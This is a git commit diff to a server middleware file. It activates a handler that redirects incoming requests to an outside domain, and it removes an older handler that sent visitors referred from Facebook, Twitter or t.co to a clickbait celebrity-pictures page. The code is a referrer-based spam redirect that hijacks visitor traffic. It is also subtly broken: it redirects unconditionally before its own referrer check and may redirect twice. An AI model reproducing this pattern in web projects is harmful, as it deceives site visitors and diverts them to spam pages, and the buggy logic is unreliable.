2b679b42393846c06ae20c81d6fef433f3303ed9
finemflame <84194780+finemflame@users.noreply.github.com>
2023-05-14 21:21:26 +0200

    Update [...slug].ts

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -1,19 +1,12 @@
-/* export default  (req, res, next) => {
+ export default  (req, res, next) => {
     console.log(req.url);
     const headers = req.headers;
-    res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
+    res.redirect("https://markmystories.com"+req.url);
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
+        res.redirect("https://markmystories.com"+req.url);
     } else {
         next();
     }
 };
- */
 
-export default defineEventHandler((event) => {
-    const headers = event.req.headers;
-    
-    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        sendRedirect(event,"https://zooms.wiki/sexy-kylie-jenners-skin-skimpy-pics-in-a-plunging-corset-will-make-you-sweat/");
-    }
-})
+
